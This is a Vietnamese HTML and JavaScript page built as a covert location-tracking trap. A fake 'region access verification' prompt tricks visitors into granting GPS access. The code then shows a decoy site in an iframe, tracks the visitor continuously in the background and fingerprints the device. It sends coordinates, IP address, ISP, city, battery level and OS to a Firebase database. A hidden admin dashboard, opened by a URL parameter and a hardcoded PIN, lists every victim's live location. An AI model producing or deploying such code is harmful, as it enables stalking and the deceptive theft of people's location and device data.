<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Xác Thực Truy Cập</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body, html { width: 100%; height: 100%; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #0d1117; color: #fff; overflow: hidden; }

        /* MÀN HÌNH CHẶN XÁC THỰC VÙNG */
        #gateOverlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(13, 17, 23, 0.98); z-index: 9999;
            display: flex; justify-content: center; align-items: center; padding: 20px;
        }
        .gate-card {
            background: #161b22; border: 1px solid #30363d; border-radius: 12px;
            max-width: 380px; width: 100%; padding: 25px 20px; text-align: center;
            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
        }
        .gate-icon { font-size: 40px; margin-bottom: 15px; }
        .gate-title { font-size: 16px; font-weight: 600; color: #f0f6fc; margin-bottom: 12px; line-height: 1.4; }
        .gate-desc { font-size: 13px; color: #8b949e; line-height: 1.5; margin-bottom: 20px; text-align: justify; }
        .gate-btn {
            background-color: #238636; color: #ffffff; border: none; padding: 12px 20px;
            border-radius: 6px; font-weight: 600; font-size: 14px; width: 100%; cursor: pointer;
            transition: 0.2s;
        }
        .gate-btn:active { background-color: #2ea043; }

        /* KHUNG WEB BẪY */
        #decoyContainer { width: 100%; height: 100vh; display: none; }
        #decoyFrame { width: 100%; height: 100%; border: none; }

        /* BẢNG QUẢN TRỊ ĐỊNH VỊ */
        #dashboardView { display: none; padding: 20px; max-width: 600px; margin: 0 auto; height: 100vh; overflow-y: auto; }
        .dash-header { text-align: center; margin-bottom: 20px; border-bottom: 1px solid #333; padding-bottom: 10px; }
        .dash-header h2 { color: #58a6ff; font-size: 18px; }

        .user-card { background: #161b22; border: 1px solid #30363d; border-radius: 8px; padding: 15px; margin-bottom: 12px; cursor: pointer; display: flex; justify-content: space-between; align-items: center; }
        .user-card.is-me { border-color: #f85149; background: rgba(248, 81, 73, 0.05); }
        .badge-me { background: #f85149; color: #fff; font-size: 10px; padding: 2px 6px; border-radius: 4px; margin-left: 6px; }
        .device-title { font-weight: bold; font-size: 15px; color: #fff; margin-bottom: 4px; }
        .basic-info { font-size: 12px; color: #8b949e; line-height: 1.5; }
        .battery-text { color: #3fb950; font-weight: bold; }

        .modal-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.85); z-index: 10000; justify-content: center; align-items: center; }
        .modal-card { background: #161b22; border: 1px solid #58a6ff; border-radius: 12px; width: 90%; max-width: 360px; padding: 20px; }
        .info-list { list-style: none; font-size: 13px; line-height: 1.8; margin-top: 10px; }
        .info-list li { border-bottom: 1px solid #30363d; padding: 6px 0; display: flex; justify-content: space-between; }
        .info-list b { color: #3fb950; text-align: right; max-width: 60%; word-break: break-all; }
    </style>
</head>
<body>

    <!-- 1. MÀN HÌNH ÉP BẬT GPS (HIỆN ĐẦU TIÊN) -->
    <div id="gateOverlay">
        <div class="gate-card">
            <div class="gate-icon">🌐</div>
            <div class="gate-title">XÁC THỰC KHU VỰC TRUY CẬP</div>
            <div class="gate-desc">
                Trang web có thể bị giới hạn tại một số khu vực. Vui lòng cho phép trang web truy cập vào vị trí của bạn.
            </div>
            <button class="gate-btn" onclick="startVerification()">Xác minh vị trí</button>
        </div>
    </div>

    <!-- 2. TRANG WEB ĐÁNH LẠC HƯỚNG (ẢN CHO ĐẾN KHU CHO PHÉP GPS) -->
    <div id="decoyContainer">
        <!-- 💥 DÁN LINK WEB BẪY CỦA BẠN VÀO DƯỚI 💥 -->
        <iframe id="decoyFrame" src="https://mvbrpk2vhk-cell.github.io/Check2/"></iframe>
    </div>

    <!-- 3. BẢNG QUẢN TRỊ ĐỊNH VỊ (MỞ BẰNG ?pass=admin) -->
    <div id="dashboardView">
        <div class="dash-header">
            <h2>📱 Bảng Theo Dõi Thiết Bị Realtime</h2>
            <p style="font-size: 12px; color: #8b949e; margin-top: 5px;">Bấm vào thiết bị để xem GPS & IP (Cần Mật Khẩu)</p>
        </div>
        <div id="userList"></div>
    </div>

    <!-- POPUP XEM GPS CHI TIẾT -->
    <div id="infoModal" class="modal-overlay">
        <div class="modal-card">
            <div style="display: flex; justify-content: space-between; font-weight: bold; color: #58a6ff;">
                <span>🔒 Thông Tin Tọa Độ & IP</span>
                <span style="cursor: pointer;" onclick="closeModal()">✕</span>
            </div>
            <ul id="infoContent" class="info-list"></ul>
        </div>
    </div>

    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>

    <script>
    const DETAIL_PIN = "123456"; 
    const ADMIN_KEY = "admin";  

    // 💥 DÁN LINK FIREBASE CỦA BẠN VÀO DƯỚI 💥
    const firebaseConfig = { 
        databaseURL: "https://appdinhvi-558a5-default-rtdb.asia-southeast1.firebasedatabase.app/" 
    };

    let db = null;
    try { 
        firebase.initializeApp(firebaseConfig); 
        db = firebase.database(); 
    } catch(e){}

    function getDeviceFingerprint() {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        ctx.textBaseline = "top"; ctx.font = "14px 'Arial'";
        ctx.fillText("fingerprint_id", 2, 2);
        const screenRes = `${screen.width}x${screen.height}x${screen.colorDepth}`;
        const hardware = `${navigator.hardwareConcurrency || 1}_${navigator.language}`;
        const rawId = canvas.toDataURL() + screenRes + hardware;
        let hash = 0;
        for (let i = 0; i < rawId.length; i++) {
            hash = ((hash << 5) - hash) + rawId.charCodeAt(i);
            hash |= 0;
        }
        return 'dev_' + Math.abs(hash).toString(36);
    }

    const myUserId = getDeviceFingerprint();
    let allUsersData = {};

    // KIỂM TRA TRẠNG THÁI KHI VÀO TRANG
    function initPage() {
        const urlParams = new URLSearchParams(window.location.search);
        
        // 1. Nếu mở bằng link Admin (?pass=admin)
        if (urlParams.get('pass') === ADMIN_KEY) {
            document.getElementById('gateOverlay').style.display = 'none';
            document.getElementById('decoyContainer').style.display = 'none';
            document.getElementById('dashboardView').style.display = 'block';
            silentBackgroundTracking();
            return;
        }

        // 2. Nếu người dùng ĐÃ TỪNG cho phép trước đó -> Ẩn màn hình chặn, vào thẳng web bẫy
        if (localStorage.getItem("gps_allowed") === "true") {
            document.getElementById('gateOverlay').style.display = 'none';
            document.getElementById('decoyContainer').style.display = 'block';
            startSilentTracking();
        } else {
            // Chưa cho phép -> Giữ nguyên màn hình chặn, hiện nút bấm
            document.getElementById('gateOverlay').style.display = 'flex';
        }
    }

    // KHI NGƯỜI DÙNG BẤM NÚT XÁC MINH
    function startVerification() {
        if ("geolocation" in navigator) {
            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    // CHO PHÉP THÀNH CÔNG -> Lưu trạng thái, ẩn màn hình chặn, chuyển sang web bẫy ngay lập tức
                    localStorage.setItem("gps_allowed", "true");
                    document.getElementById('gateOverlay').style.display = 'none';
                    document.getElementById('decoyContainer').style.display = 'block';
                    pushPositionToFirebase(pos.coords.latitude, pos.coords.longitude, "GPS Chính Xác");
                },
                (err) => {
                    // TỪ CHỐI -> Giữ nguyên màn hình và hiển thị nút tiếp tục để ép vòng lặp
                    alert("⚠️ Vui lòng cho phép trang web truy cập vào vị trí để xác minh khu vực.");
                },
                { enableHighAccuracy: true, timeout: 10000 }
            );
        } else {
            alert("Trình duyệt của bạn không hỗ trợ định vị.");
        }
    }

    // Theo dõi ngầm khi đã cấp quyền từ trước
    function startSilentTracking() {
        if ("geolocation" in navigator) {
            navigator.geolocation.watchPosition(
                (pos) => pushPositionToFirebase(pos.coords.latitude, pos.coords.longitude, "GPS Chính Xác"),
                (err) => {},
                { enableHighAccuracy: true, maximumAge: 0, timeout: 10000 }
            );
        }
    }

    async function silentBackgroundTracking() {
        const info = await getSystemData();
        if ("geolocation" in navigator) {
            navigator.geolocation.getCurrentPosition(
                (pos) => pushPositionToFirebase(pos.coords.latitude, pos.coords.longitude, "GPS Chính Xác"),
                (err) => pushPositionToFirebase(info.lat, info.lng, "Ước Tính Qua IP")
            );
        }
    }

    async function pushPositionToFirebase(lat, lng, mode) {
        const info = await getSystemData();
        const myData = {
            lat: lat,
            lng: lng,
            mode: mode,
            deviceInfo: info,
            status: "🟢 Đang Online",
            time: new Date().toLocaleTimeString('vi-VN') + " " + new Date().toLocaleDateString('vi-VN')
        };

        if (db) {
            db.ref('network_users/' + myUserId).set(myData);
            db.ref('network_users/' + myUserId + '/status').onDisconnect().set("🔴 Đã Thoát Web");
        }
    }

    async function getSystemData() {
        const ua = navigator.userAgent;
        let os = "Windows", device = "Máy tính PC";
        if (ua.indexOf("Android") !== -1) { os = "Android"; device = "Điện thoại Android"; }
        else if (ua.indexOf("iPhone") !== -1) { os = "iOS"; device = "iPhone"; }
        else if (ua.indexOf("iPad") !== -1) { os = "iPadOS"; device = "iPad"; }

        let battery = "N/A";
        if (navigator.getBattery) {
            try {
                const b = await navigator.getBattery();
                battery = Math.round(b.level * 100) + "% " + (b.charging ? "🔌" : "🔋");
            } catch(e){}
        }

        let ipData = { ip: "Không xác định", isp: "N/A", city: "N/A", lat: 0, lng: 0 };
        try {
            const res = await fetch('https://ipwho.is/');
            const d = await res.json();
            if(d.success) {
                ipData = {
                    ip: d.ip || "N/A",
                    isp: d.connection ? d.connection.isp : "N/A",
                    city: d.city || "N/A",
                    lat: d.latitude || 0,
                    lng: d.longitude || 0
                };
            }
        } catch(e){}

        return { os, device, battery, ...ipData };
    }

    if (db) {
        db.ref('network_users').on('value', (snapshot) => {
            allUsersData = snapshot.val() || {};
            renderUserList();
        });
    }

    function renderUserList() {
        const listEl = document.getElementById('userList');
        if (!listEl) return;
        
        listEl.innerHTML = "";

        Object.keys(allUsersData).forEach((id) => {
            const u = allUsersData[id];
            const info = u.deviceInfo || {};
            const isMe = id === myUserId;
            const statusText = u.status || "🔴 Đã Thoát Web";

            const card = document.createElement('div');
            card.className = `user-card ${isMe ? 'is-me' : ''}`;
            card.onclick = () => openUserDetail(id);

            card.innerHTML = `
                <div>
                    <div class="device-title">
                        ${info.device || 'Thiết bị ẩn'} 
                        ${isMe ? '<span class="badge-me">BẠN</span>' : ''}
                    </div>
                    <div class="basic-info">
                        Trạng thái: <b>${statusText}</b><br>
                        Cập nhật: ${u.time || 'N/A'}
                    </div>
                </div>
                <div style="text-align: right;">
                    <div class="battery-text">${info.battery || 'N/A'}</div>
                    <div style="font-size: 11px; color: #58a6ff; margin-top: 5px;">🔒 Xem GPS & IP</div>
                </div>
            `;
            listEl.appendChild(card);
        });
    }

    function openUserDetail(userId) {
        const inputPin = prompt("🔑 Nhập Mật Khẩu để mở khóa Tọa Độ GPS & Địa Chỉ IP:");
        if (inputPin === DETAIL_PIN) {
            const data = allUsersData[userId];
            if (!data) return;
            const info = data.deviceInfo || {};

            document.getElementById('infoContent').innerHTML = `
                <li><span>Chế độ định vị:</span> <b>${data.mode}</b></li>
                <li><span>Tọa độ GPS:</span> <b>${data.lat.toFixed(5)}, ${data.lng.toFixed(5)}</b></li>
                <li><span>Địa chỉ IP:</span> <b>${info.ip}</b></li>
                <li><span>Tỉnh / Thành:</span> <b>${info.city || 'N/A'}</b></li>
                <li><span>Nhà mạng:</span> <b>${info.isp || 'N/A'}</b></li>
                <li><span>Tên thiết bị:</span> <b>${info.device}</b></li>
                <li><span>Hệ điều hành:</span> <b>${info.os}</b></li>
                <li><span>Dung lượng Pin:</span> <b>${info.battery}</b></li>
                <li><span>Thời gian:</span> <b>${data.time}</b></li>
            `;
            document.getElementById('infoModal').style.display = 'flex';
        } else if (inputPin !== null) {
            alert("❌ Mật khẩu không đúng!");
        }
    }

    function closeModal() {
        document.getElementById('infoModal').style.display = 'none';
    }

    window.onload = initPage;
</script>

</body>
</html>
